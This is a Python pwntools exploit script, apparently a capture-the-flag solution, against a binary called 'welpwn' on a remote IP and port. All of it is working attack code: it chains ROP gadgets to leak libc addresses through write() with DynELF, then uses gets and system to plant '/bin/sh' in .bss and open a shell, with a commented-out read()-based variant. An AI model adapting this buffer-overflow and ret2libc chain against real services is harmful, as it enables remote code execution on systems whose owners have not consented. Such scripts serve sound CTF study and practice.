#!/usr/bin/env python
from pwn import *

sh = remote("111.198.29.45",38602)
elf = ELF("welpwn")
#  context.log_level = "debug"
#  context.terminal = ["konsole"]

write_plt = elf.symbols['write']
log.info("write_plt -> " + hex(write_plt))
write_got = elf.got['write']
log.info("write_got ->" + hex(write_got))
start_addr = 0x0400630
log.info("start_addr -> " + hex(start_addr))
read_got = elf.got["read"]
log.info("read_got -> " + hex(read_got))

pop6_addr = 0x0040089a
pop4_addr = 0x0040089c
mov_addr = 0x00400880
pop_rdi = 0x004008a3
bss_addr = elf.bss()

def leak(addr):
    print sh.recv()
    rop = 'a'*24 + p64(pop4_addr) + p64(pop6_addr)
    # rbx rbp r12
    rop += p64(0) + p64(1) + p64(write_got)
    # r13 r14 r15 ret2gadget -> mov
    rop += p64(8) + p64(addr) + p64(1) + p64(mov_addr)
    # padding 
    rop += 'a' * 56
    # ret2start
    rop += p64(start_addr)
    rop = rop.ljust(1024,'c')
    #  gdb.attach(sh)
    sh.send(rop)
    data = sh.recv(8)
    #  log.info("%#x => %s" %(addr,hex(u64((data or '').ljust(8,'\x00')))))
    #  log.success("leak_addr -> " + hex(u64(addr)))
    return data

if __name__ == "__main__":

    d = DynELF(leak, elf=ELF("./welpwn"))
    system_addr = d.lookup("system", "libc")
    log.success("system_addr -> " + hex(system_addr))

    # method one: use read()

    #  payload = 'a' * 24 + p64(pop4_addr) + p64(pop6_addr) + p64(0) + p64(1) + p64(read_got)
    #  payload += p64(8) + p64(bss_addr) + p64(0)
    #  payload += p64(mov_addr) + 'a' * 56 + p64(pop_rdi) + p64(bss_addr) + p64(system_addr)
    #  sh.send(payload)
    #  sh.sendline("/bin/sh\0")

    # methon two: use gets

    gets_addr = d.lookup("gets", "libc")
    log.success("gets_addr -> ", hex(gets_addr))
    payload = 'a' * 24 + p64(pop4_addr) + p64(pop_rdi)
    payload += p64(bss_addr) + p64(gets_addr) + p64(pop_rdi) + p64(bss_addr) + p64(system_addr)
    sh.send(payload)
    sh.sendline("/bin/sh\0")
    
    sh.interactive()
